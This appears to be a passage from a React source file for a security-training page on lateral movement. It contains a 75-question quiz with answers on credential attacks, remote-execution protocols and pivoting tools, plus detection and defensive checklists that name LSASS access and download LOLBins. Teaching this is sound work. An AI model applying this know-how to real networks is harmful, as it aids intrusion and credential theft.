import React, { useState } from "react";
import {
  Box,
  Container,
  Typography,
  Paper,
  Tabs,
  Tab,
  Chip,
  Button,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Alert,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Grid,
  IconButton,
  Tooltip,
  Divider,
  alpha,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import AccountTreeIcon from "@mui/icons-material/AccountTree";
import ComputerIcon from "@mui/icons-material/Computer";
import TerminalIcon from "@mui/icons-material/Terminal";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import SecurityIcon from "@mui/icons-material/Security";
import StorageIcon from "@mui/icons-material/Storage";
import CloudIcon from "@mui/icons-material/Cloud";
import BuildIcon from "@mui/icons-material/Build";
import BugReportIcon from "@mui/icons-material/BugReport";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import WarningIcon from "@mui/icons-material/Warning";
import KeyboardArrowRightIcon from "@mui/icons-material/KeyboardArrowRight";
import ShieldIcon from "@mui/icons-material/Shield";
import SearchIcon from "@mui/icons-material/Search";
import QuizIcon from "@mui/icons-material/Quiz";
import { Link, useNavigate } from "react-router-dom";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";

// Theme colors
const theme = {
  primary: "#ef4444",
  primaryLight: "#f87171",
  secondary: "#f97316",
  accent: "#8b5cf6",
  success: "#10b981",
  warning: "#f59e0b",
  info: "#06b6d4",
  bgDark: "#0a0a0f",
  bgCard: "#12121a",
  bgNested: "#0f1024",
  bgCode: "#1a1a2e",
  border: "rgba(239, 68, 68, 0.2)",
  text: "#e2e8f0",
  textMuted: "#94a3b8",
};

const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = theme.accent;

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Foundations",
    question: "What is lateral movement?",
    options: [
      "Moving from one system to another within a network",
      "Gaining administrator rights on a single host",
      "Encrypting files to hide activity",
      "Disabling endpoint logging",
    ],
    correctAnswer: 0,
    explanation: "Lateral movement focuses on spreading access to additional systems.",
  },
  {
    id: 2,
    topic: "Foundations",
    question: "How does lateral movement differ from privilege escalation?",
    options: [
      "Lateral movement targets other systems; escalation raises privilege level",
      "Lateral movement only uses Linux; escalation only uses Windows",
      "Lateral movement disables logs; escalation enables logs",
      "There is no difference between the two",
    ],
    correctAnswer: 0,
    explanation: "Escalation increases privileges, while lateral movement spreads to new hosts.",
  },
  {
    id: 3,
    topic: "Foundations",
    question: "Which is a common prerequisite for lateral movement?",
    options: [
      "Valid credentials or tokens",
      "A public vulnerability scanner",
      "Physical access to the data center",
      "A kernel exploit on every host",
    ],
    correctAnswer: 0,
    explanation: "Lateral movement often depends on reusing valid credentials or tickets.",
  },
  {
    id: 4,
    topic: "Protocols",
    question: "PsExec typically uses which protocol?",
    options: [
      "SMB",
      "DNS",
      "ICMP",
      "FTP",
    ],
    correctAnswer: 0,
    explanation: "PsExec uses SMB to copy and create a service on the remote host.",
  },
  {
    id: 5,
    topic: "Protocols",
    question: "What is the default port for RDP?",
    options: [
      "3389",
      "22",
      "445",
      "5985",
    ],
    correctAnswer: 0,
    explanation: "RDP typically listens on TCP 3389.",
  },
  {
    id: 6,
    topic: "Protocols",
    question: "Which ports are commonly used by WinRM?",
    options: [
      "5985 and 5986",
      "80 and 443",
      "135 and 139",
      "53 and 123",
    ],
    correctAnswer: 0,
    explanation: "WinRM uses 5985 for HTTP and 5986 for HTTPS.",
  },
  {
    id: 7,
    topic: "Protocols",
    question: "WMI remote execution commonly uses:",
    options: [
      "DCOM/RPC",
      "DNS over HTTPS",
      "SMTP",
      "SNMP",
    ],
    correctAnswer: 0,
    explanation: "WMI leverages DCOM and RPC endpoints.",
  },
  {
    id: 8,
    topic: "Protocols",
    question: "What is the default port for SSH?",
    options: [
      "22",
      "21",
      "23",
      "3389",
    ],
    correctAnswer: 0,
    explanation: "SSH typically listens on TCP port 22.",
  },
  {
    id: 9,
    topic: "Credentials",
    question: "Pass-the-Hash uses:",
    options: [
      "An NTLM hash instead of a plaintext password",
      "A Kerberos ticket instead of a hash",
      "A local API key only",
      "A password reset token",
    ],
    correctAnswer: 0,
    explanation: "PTH authenticates using NTLM hashes without the plaintext password.",
  },
  {
    id: 10,
    topic: "Credentials",
    question: "Pass-the-Ticket uses:",
    options: [
      "A Kerberos ticket for authentication",
      "A stored SSH key",
      "A password reset link",
      "A browser cookie only",
    ],
    correctAnswer: 0,
    explanation: "PTT reuses Kerberos tickets to authenticate to services.",
  },
  {
    id: 11,
    topic: "Credentials",
    question: "A Golden Ticket requires:",
    options: [
      "The krbtgt account hash",
      "A local administrator password",
      "An SSH private key",
      "A valid certificate authority key",
    ],
    correctAnswer: 0,
    explanation: "Golden Tickets are forged using the krbtgt hash.",
  },
  {
    id: 12,
    topic: "Credentials",
    question: "A Silver Ticket represents:",
    options: [
      "A forged service ticket for a specific service",
      "A forged TGT for the entire domain",
      "A password reset token",
      "A DNS TXT record",
    ],
    correctAnswer: 0,
    explanation: "Silver Tickets are forged service tickets (TGS).",
  },
  {
    id: 13,
    topic: "Credentials",
    question: "Overpass-the-Hash is:",
    options: [
      "Using an NTLM hash to obtain a Kerberos TGT",
      "Using a Kerberos ticket to obtain an NTLM hash",
      "Exfiltrating hashes over DNS",
      "Resetting a password through LDAP",
    ],
    correctAnswer: 0,
    explanation: "Overpass-the-Hash converts NTLM material into Kerberos tickets.",
  },
  {
    id: 14,
    topic: "Credentials",
    question: "DCSync enables an attacker to:",
    options: [
      "Replicate AD secrets from a domain controller",
      "Disable SMB signing",
      "Reset workstation passwords",
      "Create new DNS zones",
    ],
    correctAnswer: 0,
    explanation: "DCSync abuses replication permissions to pull credential data.",
  },
  {
    id: 15,
    topic: "Credentials",
    question: "Credential dumping is often performed to:",
    options: [
      "Obtain hashes or tickets for lateral movement",
      "Remove all scheduled tasks",
      "Reset firewall rules",
      "Enable UAC prompts",
    ],
    correctAnswer: 0,
    explanation: "Dumping credentials provides reusable authentication material.",
  },
  {
    id: 16,
    topic: "Tooling",
    question: "CrackMapExec/NetExec is commonly used for:",
    options: [
      "SMB/WinRM enumeration and remote command execution",
      "Kernel exploit development",
      "Wireless packet capture",
      "Memory forensics analysis",
    ],
    correctAnswer: 0,
    explanation: "CME/NetExec automates SMB and WinRM testing and execution.",
  },
  {
    id: 17,
    topic: "Tooling",
    question: "The Impacket suite provides:",
    options: [
      "Remote execution tools like psexec.py and wmiexec.py",
      "A GUI for vulnerability management",
      "A host-based IDS",
      "A password manager",
    ],
    correctAnswer: 0,
    explanation: "Impacket includes multiple remote execution and AD tools.",
  },
  {
    id: 18,
    topic: "Tooling",
    question: "BloodHound helps by:",
    options: [
      "Mapping Active Directory relationships and attack paths",
      "Encrypting C2 traffic automatically",
      "Scanning external IP ranges",
      "Blocking suspicious RDP logons",
    ],
    correctAnswer: 0,
    explanation: "BloodHound visualizes AD paths to identify lateral movement routes.",
  },
  {
    id: 19,
    topic: "Tooling",
    question: "SharpHound is:",
    options: [
      "The data collector used by BloodHound",
      "A Linux kernel module",
      "A web proxy for tunneling",
      "A DNS exfiltration tool",
    ],
    correctAnswer: 0,
    explanation: "SharpHound collects AD data for BloodHound analysis.",
  },
  {
    id: 20,
    topic: "Tooling",
    question: "PowerView is best described as:",
    options: [
      "A PowerShell toolkit for AD enumeration",
      "A disk encryption utility",
      "An endpoint detection platform",
      "A malware packing tool",
    ],
    correctAnswer: 0,
    explanation: "PowerView gathers AD information via PowerShell.",
  },
  {
    id: 21,
    topic: "Protocols",
    question: "Admin shares refer to:",
    options: [
      "Hidden SMB shares like C$ and ADMIN$",
      "Public FTP directories",
      "Cloud storage buckets",
      "RDP session files",
    ],
    correctAnswer: 0,
    explanation: "Admin shares are default hidden SMB shares on Windows systems.",
  },
  {
    id: 22,
    topic: "Artifacts",
    question: "Remote service creation typically leaves which artifact?",
    options: [
      "Event ID 7045 (service creation)",
      "Event ID 4624 type 10",
      "Event ID 1102 (log clear)",
      "Event ID 5156 (firewall allow)",
    ],
    correctAnswer: 0,
    explanation: "Service creation is logged under event ID 7045.",
  },
  {
    id: 23,
    topic: "Techniques",
    question: "Scheduled task lateral movement often uses:",
    options: [
      "schtasks to run a command remotely",
      "DNS TXT records to store commands",
      "ARP spoofing to capture traffic",
      "Kerberos delegation to avoid tasks",
    ],
    correctAnswer: 0,
    explanation: "schtasks can create and run tasks remotely with credentials.",
  },
  {
    id: 24,
    topic: "Techniques",
    question: "WMI lateral movement commonly uses:",
    options: [
      "wmic or PowerShell WMI cmdlets",
      "Only SMB file copy",
      "ICMP ping sweeps",
      "FTP anonymous login",
    ],
    correctAnswer: 0,
    explanation: "WMI execution can be performed with wmic or PowerShell.",
  },
  {
    id: 25,
    topic: "Techniques",
    question: "WinRM lateral movement relies on:",
    options: [
      "PowerShell remoting with WinRM enabled",
      "Kerberos ticket forging only",
      "SSH port forwarding",
      "Local admin shares",
    ],
    correctAnswer: 0,
    explanation: "WinRM provides PowerShell remoting when enabled.",
  },
  {
    id: 26,
    topic: "Defense",
    question: "SMB signing helps prevent:",
    options: [
      "NTLM relay attacks",
      "Password spraying",
      "Local file reads",
      "RDP brute force",
    ],
    correctAnswer: 0,
    explanation: "SMB signing blocks relay by enforcing message integrity.",
  },
  {
    id: 27,
    topic: "Defense",
    question: "Credential Guard primarily protects:",
    options: [
      "LSASS secrets and hashes",
      "DNS cache entries",
      "Browser history files",
      "Windows update binaries",
    ],
    correctAnswer: 0,
    explanation: "Credential Guard isolates secrets from user-mode attacks.",
  },
  {
    id: 28,
    topic: "Defense",
    question: "Network segmentation helps by:",
    options: [
      "Limiting reachable hosts and paths",
      "Eliminating the need for monitoring",
      "Guaranteeing all services are patched",
      "Allowing open access to admin shares",
    ],
    correctAnswer: 0,
    explanation: "Segmentation restricts east-west movement between networks.",
  },
  {
    id: 29,
    topic: "Defense",
    question: "Jump hosts are used to:",
    options: [
      "Centralize and control administrative access",
      "Automatically scan the internet",
      "Store malware samples",
      "Disable logging on servers",
    ],
    correctAnswer: 0,
    explanation: "Jump hosts reduce exposure by funneling admin access through controlled systems.",
  },
  {
    id: 30,
    topic: "Credentials",
    question: "Local admin password reuse increases risk of:",
    options: [
      "Rapid lateral movement across hosts",
      "Automatic patch failures",
      "Lower CPU utilization",
      "Improved MFA adoption",
    ],
    correctAnswer: 0,
    explanation: "Reuse lets attackers move quickly once one host is compromised.",
  },
  {
    id: 31,
    topic: "Defense",
    question: "LAPS mitigates lateral movement by:",
    options: [
      "Providing unique local admin passwords per host",
      "Disabling all SMB traffic",
      "Blocking RDP entirely",
      "Rotating domain admin passwords hourly",
    ],
    correctAnswer: 0,
    explanation: "Unique local admin passwords stop reuse across machines.",
  },
  {
    id: 32,
    topic: "Defense",
    question: "Kerberos pre-authentication helps prevent:",
    options: [
      "AS-REP roasting",
      "DNS tunneling",
      "Password spraying",
      "RDP brute force",
    ],
    correctAnswer: 0,
    explanation: "Pre-authentication blocks unauthenticated AS-REP responses.",
  },
  {
    id: 33,
    topic: "Detection",
    question: "Windows event 4624 type 3 indicates:",
    options: [
      "A network logon",
      "A local interactive logon",
      "A service start",
      "A scheduled task creation",
    ],
    correctAnswer: 0,
    explanation: "Logon type 3 represents network logons.",
  },
  {
    id: 34,
    topic: "Detection",
    question: "Windows event 4624 type 10 indicates:",
    options: [
      "A remote interactive (RDP) logon",
      "A batch job run",
      "A network logon via SMB",
      "A system reboot",
    ],
    correctAnswer: 0,
    explanation: "Logon type 10 is associated with RDP sessions.",
  },
  {
    id: 35,
    topic: "Detection",
    question: "Windows event 4648 indicates:",
    options: [
      "A logon using explicit credentials",
      "A service installed",
      "A firewall rule change",
      "A system shutdown",
    ],
    correctAnswer: 0,
    explanation: "Event 4648 shows use of explicit credentials.",
  },
  {
    id: 36,
    topic: "Detection",
    question: "Windows event 4769 indicates:",
    options: [
      "A Kerberos service ticket request",
      "A DNS zone transfer",
      "A local group change",
      "A registry modification",
    ],
    correctAnswer: 0,
    explanation: "Event 4769 logs TGS requests.",
  },
  {
    id: 37,
    topic: "Detection",
    question: "Windows event 4776 indicates:",
    options: [
      "An NTLM authentication attempt",
      "A scheduled task execution",
      "A new service start",
      "A log cleared event",
    ],
    correctAnswer: 0,
    explanation: "Event 4776 relates to NTLM authentication.",
  },
  {
    id: 38,
    topic: "Detection",
    question: "Sysmon Event ID 1 records:",
    options: [
      "Process creation",
      "Network connections",
      "File deletions",
      "Registry queries",
    ],
    correctAnswer: 0,
    explanation: "Sysmon 1 logs process creation.",
  },
  {
    id: 39,
    topic: "Detection",
    question: "Sysmon Event ID 3 records:",
    options: [
      "Network connections",
      "Driver loads",
      "Logon sessions",
      "Scheduled tasks",
    ],
    correctAnswer: 0,
    explanation: "Sysmon 3 tracks network connections.",
  },
  {
    id: 40,
    topic: "Pivoting",
    question: "What does pivoting mean in lateral movement?",
    options: [
      "Routing traffic through a compromised host to reach new targets",
      "Escalating from user to admin on the same host",
      "Encrypting files for exfiltration",
      "Disabling SMB signing",
    ],
    correctAnswer: 0,
    explanation: "Pivoting uses a foothold to reach systems on different networks.",
  },
  {
    id: 41,
    topic: "Pivoting",
    question: "A SOCKS proxy is used to:",
    options: [
      "Forward traffic through a pivot host",
      "Reset domain passwords",
      "Block all outbound connections",
      "Scan for local USB devices",
    ],
    correctAnswer: 0,
    explanation: "SOCKS proxies relay traffic through an intermediary host.",
  },
  {
    id: 42,
    topic: "Pivoting",
    question: "What does `ssh -D` create?",
    options: [
      "A dynamic SOCKS proxy",
      "A static port forward only",
      "A DNS server",
      "A Kerberos ticket",
    ],
    correctAnswer: 0,
    explanation: "ssh -D opens a dynamic port for SOCKS proxying.",
  },
  {
    id: 43,
    topic: "Pivoting",
    question: "Chisel is commonly used for:",
    options: [
      "HTTP-based tunneling and port forwarding",
      "Password cracking",
      "Memory forensics",
      "Disk encryption",
    ],
    correctAnswer: 0,
    explanation: "Chisel creates tunnels over HTTP for pivoting.",
  },
  {
    id: 44,
    topic: "Pivoting",
    question: "Proxychains is used to:",
    options: [
      "Route tool traffic through a proxy",
      "Disable all DNS queries",
      "Automate patching",
      "Create local admin users",
    ],
    correctAnswer: 0,
    explanation: "Proxychains forces tools to use a configured proxy chain.",
  },
  {
    id: 45,
    topic: "Pivoting",
    question: "Port forwarding differs from tunneling because:",
    options: [
      "It forwards a specific port rather than arbitrary traffic",
      "It requires no credentials",
      "It disables encryption",
      "It only works over DNS",
    ],
    correctAnswer: 0,
    explanation: "Port forwarding exposes a specific port while tunnels can carry wider traffic.",
  },
  {
    id: 46,
    topic: "Artifacts",
    question: "RDP lateral movement often leaves:",
    options: [
      "TerminalServices and logon events",
      "No logs at all",
      "Only DNS query logs",
      "Only firewall drop logs",
    ],
    correctAnswer: 0,
    explanation: "RDP logons generate TerminalServices and security log events.",
  },
  {
    id: 47,
    topic: "Techniques",
    question: "PsExec executes commands by:",
    options: [
      "Creating a service on the remote host",
      "Injecting code into LSASS",
      "Using a browser exploit",
      "Modifying group policies directly",
    ],
    correctAnswer: 0,
    explanation: "PsExec copies a service binary and creates a service to run commands.",
  },
  {
    id: 48,
    topic: "Techniques",
    question: "Why is WMI execution sometimes considered stealthier than PsExec?",
    options: [
      "It typically does not create a new service",
      "It disables logging automatically",
      "It requires no credentials",
      "It only runs from Domain Controllers",
    ],
    correctAnswer: 0,
    explanation: "WMI exec can avoid the service creation artifact.",
  },
  {
    id: 49,
    topic: "Techniques",
    question: "WinRM lateral movement requires:",
    options: [
      "WinRM enabled and valid credentials",
      "Local admin shares disabled",
      "Kerberos pre-authentication disabled",
      "A writable registry key",
    ],
    correctAnswer: 0,
    explanation: "WinRM must be enabled and requires authentication.",
  },
  {
    id: 50,
    topic: "Techniques",
    question: "Remote registry access allows an attacker to:",
    options: [
      "Query or modify registry keys remotely",
      "Access BIOS settings directly",
      "Disable kernel protections only",
      "Install drivers without privileges",
    ],
    correctAnswer: 0,
    explanation: "Remote registry can expose sensitive config if enabled and permitted.",
  },
  {
    id: 51,
    topic: "OPSEC",
    question: "Why use living off the land binaries (LOLBins)?",
    options: [
      "They reduce the need to drop new tools on disk",
      "They remove the need for credentials",
      "They eliminate logging",
      "They guarantee persistence",
    ],
    correctAnswer: 0,
    explanation: "Native tools blend into normal admin activity and reduce artifacts.",
  },
  {
    id: 52,
    topic: "Defense",
    question: "NTLM relay typically requires:",
    options: [
      "SMB signing not enforced",
      "Kerberos pre-authentication enabled",
      "RDP disabled on targets",
      "Local admin passwords rotated daily",
    ],
    correctAnswer: 0,
    explanation: "SMB signing blocks relay by ensuring message integrity.",
  },
  {
    id: 53,
    topic: "Defense",
    question: "If SMB signing is required, NTLM relay is:",
    options: [
      "Mostly blocked or ineffective",
      "Guaranteed to succeed",
      "Faster than Kerberos",
      "Required for WinRM",
    ],
    correctAnswer: 0,
    explanation: "SMB signing prevents relayed SMB authentication.",
  },
  {
    id: 54,
    topic: "Credentials",
    question: "Pass-the-Hash works when:",
    options: [
      "NTLM authentication is allowed",
      "Kerberos is the only protocol",
      "SMB is fully blocked",
      "MFA is enforced for every service",
    ],
    correctAnswer: 0,
    explanation: "PTH requires NTLM authentication to be accepted by the service.",
  },
  {
    id: 55,
    topic: "Credentials",
    question: "Kerberos ticket lifetime affects:",
    options: [
      "How long the ticket can be used",
      "Whether DNS resolves correctly",
      "Whether SMB signing is enabled",
      "The length of user passwords",
    ],
    correctAnswer: 0,
    explanation: "Tickets expire after their configured lifetime.",
  },
  {
    id: 56,
    topic: "Kerberos",
    question: "TGT stands for:",
    options: [
      "Ticket Granting Ticket",
      "Target Group Token",
      "Trusted Gateway Token",
      "Transport Gateway Tunnel",
    ],
    correctAnswer: 0,
    explanation: "A TGT allows requesting service tickets from the KDC.",
  },
  {
    id: 57,
    topic: "Kerberos",
    question: "SPN stands for:",
    options: [
      "Service Principal Name",
      "Secure Path Node",
      "System Policy Number",
      "Session Provisioning Namespace",
    ],
    correctAnswer: 0,
    explanation: "SPNs identify services for Kerberos authentication.",
  },
  {
    id: 58,
    topic: "Kerberos",
    question: "Service accounts often have:",
    options: [
      "Elevated or delegated privileges",
      "No permissions at all",
      "Only guest access",
      "Disabled logon rights",
    ],
    correctAnswer: 0,
    explanation: "Service accounts may have broad access to run services.",
  },
  {
    id: 59,
    topic: "Credentials",
    question: "Credential hopping means:",
    options: [
      "Reusing stolen credentials across multiple hosts",
      "Resetting passwords via email",
      "Deleting credential caches",
      "Blocking authentication events",
    ],
    correctAnswer: 0,
    explanation: "Hopping uses the same creds to move to other systems.",
  },
  {
    id: 60,
    topic: "Pivoting",
    question: "A pivot host is:",
    options: [
      "A compromised system used to reach other networks",
      "A domain controller only",
      "A workstation used for backups",
      "A cloud identity provider",
    ],
    correctAnswer: 0,
    explanation: "Pivot hosts act as relays into additional segments.",
  },
  {
    id: 61,
    topic: "Protocols",
    question: "SMB lateral movement commonly uses which share?",
    options: [
      "ADMIN$ or C$",
      "SYSVOL only",
      "NETLOGON only",
      "IPC$ only",
    ],
    correctAnswer: 0,
    explanation: "Admin shares are used to copy tools or create services.",
  },
  {
    id: 62,
    topic: "Defense",
    question: "RDP Restricted Admin Mode helps by:",
    options: [
      "Not sending reusable credentials to the remote host",
      "Disabling all RDP logging",
      "Bypassing MFA requirements",
      "Enabling SMB signing automatically",
    ],
    correctAnswer: 0,
    explanation: "Restricted Admin Mode reduces credential theft risk on remote hosts.",
  },
  {
    id: 63,
    topic: "Protocols",
    question: "Remote PowerShell typically uses:",
    options: [
      "WinRM",
      "SMB",
      "RDP",
      "DNS",
    ],
    correctAnswer: 0,
    explanation: "PowerShell remoting uses WinRM (WS-Man).",
  },
  {
    id: 64,
    topic: "Protocols",
    question: "DCOM is commonly used by:",
    options: [
      "WMI for remote execution",
      "RDP for screen sharing",
      "DNS for query resolution",
      "SSH for key exchange",
    ],
    correctAnswer: 0,
    explanation: "WMI leverages DCOM for remote operations.",
  },
  {
    id: 65,
    topic: "Kerberos",
    question: "RBCD stands for:",
    options: [
      "Resource-Based Constrained Delegation",
      "Remote Browser Credential Dumping",
      "Root Backup and Configuration Data",
      "Remote Binary Code Delivery",
    ],
    correctAnswer: 0,
    explanation: "RBCD allows delegation rights to be set on target resources.",
  },
  {
    id: 66,
    topic: "Kerberos",
    question: "Kerberos delegation can be abused to:",
    options: [
      "Impersonate users to services",
      "Disable all authentication",
      "Remove all domain trusts",
      "Encrypt DNS traffic",
    ],
    correctAnswer: 0,
    explanation: "Delegation misconfigurations can allow impersonation to services.",
  },
  {
    id: 67,
    topic: "Detection",
    question: "Honeytokens are used to:",
    options: [
      "Detect unauthorized access attempts",
      "Speed up authentication",
      "Replace MFA devices",
      "Hide log files",
    ],
    correctAnswer: 0,
    explanation: "Honeytokens trigger alerts when accessed by attackers.",
  },
  {
    id: 68,
    topic: "Defense",
    question: "Egress filtering limits:",
    options: [
      "Outbound connections from compromised hosts",
      "All inbound traffic to servers",
      "Local file writes",
      "USB device access",
    ],
    correctAnswer: 0,
    explanation: "Egress controls restrict outbound connectivity for malware.",
  },
  {
    id: 69,
    topic: "Defense",
    question: "Firewall rules on servers help by:",
    options: [
      "Restricting remote admin protocols",
      "Disabling all logging",
      "Increasing DNS cache size",
      "Forcing password reuse",
    ],
    correctAnswer: 0,
    explanation: "Restricting RDP, SMB, and WinRM reduces lateral movement paths.",
  },
  {
    id: 70,
    topic: "Defense",
    question: "MFA for admin sessions reduces:",
    options: [
      "Impact of stolen passwords",
      "Need for patching",
      "Endpoint logging",
      "Network segmentation",
    ],
    correctAnswer: 0,
    explanation: "MFA adds an extra factor beyond a stolen password.",
  },
  {
    id: 71,
    topic: "Linux",
    question: "On Linux, lateral movement commonly uses:",
    options: [
      "SSH with keys or passwords",
      "RDP services",
      "SMB admin shares",
      "WMI",
    ],
    correctAnswer: 0,
    explanation: "SSH is the standard remote admin protocol on Linux systems.",
  },
  {
    id: 72,
    topic: "Linux",
    question: "Why is SSH agent forwarding risky?",
    options: [
      "A compromised host can use the forwarded agent to access other hosts",
      "It disables SSH encryption",
      "It forces password changes",
      "It blocks key-based authentication",
    ],
    correctAnswer: 0,
    explanation: "Forwarded agents can be abused for additional access.",
  },
  {
    id: 73,
    topic: "Linux",
    question: "What is `ssh -J` used for?",
    options: [
      "Connecting via a jump host",
      "Generating SSH keys",
      "Resetting SSH configs",
      "Blocking SSH connections",
    ],
    correctAnswer: 0,
    explanation: "The -J flag defines a jump or bastion host.",
  },
  {
    id: 74,
    topic: "Pivoting",
    question: "SOCKS proxies are often used to:",
    options: [
      "Run internal scans through a pivot",
      "Disable local firewalls",
      "Create new admin users",
      "Reset passwords across a domain",
    ],
    correctAnswer: 0,
    explanation: "SOCKS allows tools to reach internal targets through a pivot.",
  },
  {
    id: 75,
    topic: "Cloud",
    question: "Cloud lateral movement often leverages:",
    options: [
      "Instance metadata credentials",
      "BIOS passwords",
      "Local print spoolers",
      "FTP anonymous logins",
    ],
    correctAnswer: 0,
    explanation: "Metadata endpoints can provide credentials to other resources.",
  },
];

interface TabPanelProps {
  children?: React.ReactNode;
  index: number;
  value: number;
}

function TabPanel(props: TabPanelProps) {
  const { children, value, index, ...other } = props;
  return (
    <div role="tabpanel" hidden={value !== index} {...other}>
      {value === index && <Box sx={{ py: 3 }}>{children}</Box>}
    </div>
  );
}

// Enhanced CodeBlock
const CodeBlock: React.FC<{ code: string; language?: string; title?: string }> = ({ code, language = "powershell", title }) => {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      elevation={0}
      sx={{
        bgcolor: theme.bgCode,
        borderRadius: 3,
        position: "relative",
        my: 2,
        border: `1px solid ${theme.border}`,
        overflow: "hidden",
      }}
    >
      <Box
        sx={{
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          px: 2,
          py: 1,
          bgcolor: alpha(theme.primary, 0.1),
          borderBottom: `1px solid ${theme.border}`,
        }}
      >
        <Box sx={{ display: "flex", alignItems: "center", gap: 1.5 }}>
          <TerminalIcon sx={{ fontSize: 16, color: theme.primary }} />
          {title && <Typography variant="caption" sx={{ color: theme.textMuted }}>{title}</Typography>}
          <Chip label={language} size="small" sx={{ bgcolor: theme.primary, color: "#fff", fontWeight: 600, fontSize: "0.7rem", height: 20 }} />
        </Box>
        <Tooltip title={copied ? "Copied!" : "Copy"}>
          <IconButton size="small" onClick={handleCopy} sx={{ color: copied ? theme.success : theme.textMuted }}>
            <ContentCopyIcon fontSize="small" />
          </IconButton>
        </Tooltip>
      </Box>
      <Box
        component="pre"
        sx={{
          m: 0,
          p: 2.5,
          overflow: "auto",
          color: theme.text,
          fontSize: "0.85rem",
          fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
          lineHeight: 1.6,
          maxHeight: "500px",
          "&::-webkit-scrollbar": { width: 8, height: 8 },
          "&::-webkit-scrollbar-track": { bgcolor: alpha(theme.primary, 0.1), borderRadius: 4 },
          "&::-webkit-scrollbar-thumb": { bgcolor: alpha(theme.primary, 0.3), borderRadius: 4 },
        }}
      >
        {code}
      </Box>
    </Paper>
  );
};

// Styled Accordion wrapper
const accordionSx = (color: string = theme.primary) => ({
  bgcolor: theme.bgNested,
  borderRadius: "12px !important",
  border: `1px solid ${alpha(color, 0.2)}`,
  mb: 2,
  "&:before": { display: "none" },
  "&:hover": { borderColor: alpha(color, 0.4) },
  transition: "all 0.2s ease",
  overflow: "hidden",
});

const accordionSummarySx = (color: string = theme.primary) => ({
  borderBottom: `1px solid ${alpha(color, 0.1)}`,
  "&:hover": { bgcolor: alpha(color, 0.05) },
});

const LateralMovementPage: React.FC = () => {
  const navigate = useNavigate();
  const [tabValue, setTabValue] = useState(0);

  const pageContext = `This page covers Lateral Movement techniques for penetration testing including Windows remote protocols (PsExec, WMI, WinRM, DCOM, RDP), Living off the Land (LOLBins), credential attacks (Pass-the-Hash, Pass-the-Ticket, Kerberoasting), Linux/SSH pivoting, cloud pivoting, container escape, and OPSEC best practices. It also includes telemetry artifacts, detection signals, and defensive checklists for blue teams.`;
  const movementObjectives = [
    "Expand access to higher-value systems and data.",
    "Reach isolated networks through trusted hosts.",
    "Establish persistence for future access.",
    "Blend into normal admin traffic to avoid detection.",
  ];
  const artifactMatrix = [
    { source: "Windows Security Logs", artifact: "Logon events (4624/4625), explicit creds (4648)" },
    { source: "Sysmon", artifact: "Process creation (1), network connections (3)" },
    { source: "Windows Services", artifact: "Service creation (7045) for remote exec" },
    { source: "RDP Logs", artifact: "Logon type 10, TerminalServices events" },
    { source: "SMB Logs", artifact: "Admin share access (C$, ADMIN$)" },
  ];
  const defensiveChecklist = [
    "Disable or restrict legacy protocols (NTLM where possible).",
    "Segment admin paths and require jump hosts.",
    "Enable PowerShell logging and Sysmon where allowed.",
    "Limit local admin rights and remove stale accounts.",
    "Monitor for new services, scheduled tasks, and remote logons.",
  ];
  const windowsProtocolMatrix = [
    { protocol: "SMB/PsExec", ports: "445", auth: "NTLM/Kerberos", artifacts: "Service 7045, admin$ writes" },
    { protocol: "WMI", ports: "135 + RPC", auth: "NTLM/Kerberos", artifacts: "WMI activity, process creation" },
    { protocol: "WinRM", ports: "5985/5986", auth: "Kerberos/NTLM", artifacts: "WinRM logs, PowerShell events" },
    { protocol: "RDP", ports: "3389", auth: "Kerberos/NTLM", artifacts: "Logon type 10, RDP logs" },
  ];
  const windowsEventIds = [
    "4624/4625: Successful/failed logons",
    "4648: Logon with explicit credentials",
    "4672: Special privileges assigned",
    "4688: Process creation",
    "4698: Scheduled task created",
    "7045: Service installed",
  ];
  const lolbinDetections = [
    "Unusual LOLBin parent processes (Office -> cmd/PowerShell).",
    "Remote execution tools from non-admin hosts.",
    "Download activity to temp paths (certutil, bitsadmin).",
    "Suspicious script block logging patterns.",
    "New scheduled tasks or services created rapidly.",
  ];
  const credentialDetection = [
    "Kerberos ticket requests from non-admin hosts",
    "Multiple NTLM logons across many hosts",
    "LSASS access from non-standard processes",
    "RDP logons followed by admin share access",
    "New admin group membership or privilege changes",
  ];
  const linuxMovementPatterns = [
    "SSH from user workstations to servers",
    "Sudo usage outside normal maintenance windows",
    "New SSH keys added to authorized_keys",
    "Unexpected scp/rsync transfers between hosts",
    "New services listening on non-standard ports",
  ];
  const cloudPivotPaths = [
    "Role chaining or privilege escalation via IAM",
    "Lateral movement through SSM/RunCommand",
    "Access to storage services (S3/Blob) from new principals",
    "Container or function execution using stolen tokens",
    "Cross-account access via misconfigured trust policies",
  ];
  const cloudTelemetry = [
    "Cloud audit logs (CloudTrail, Azure Activity, GCP Audit)",
    "IAM changes and role assumption events",
    "Network flow logs and security group changes",
    "Storage access logs and object reads",
    "Serverless function invocations and role usage",
  ];

  return (
    <LearnPageLayout pageTitle="Lateral Movement Techniques" pageContext={pageContext}>
    <Box sx={{ minHeight: "100vh", bgcolor: theme.bgDark, py: 4 }}>
      <Container maxWidth="lg">
        {/* Header */}
        <Box sx={{ mb: 5 }}>
          <Chip
            component={Link}
            to="/learn"
            icon={<ArrowBackIcon />}
            label="Back to Learning Hub"
            clickable
            variant="outlined"
            sx={{ borderRadius: 2, mb: 3 }}
          />

          {/* Hero Section */}
          <Paper
            elevation={0}
            sx={{
              p: 4,
              background: `linear-gradient(135deg, ${alpha(theme.primary, 0.15)} 0%, ${alpha(theme.bgCard, 0.9)} 50%, ${alpha(theme.accent, 0.1)} 100%)`,
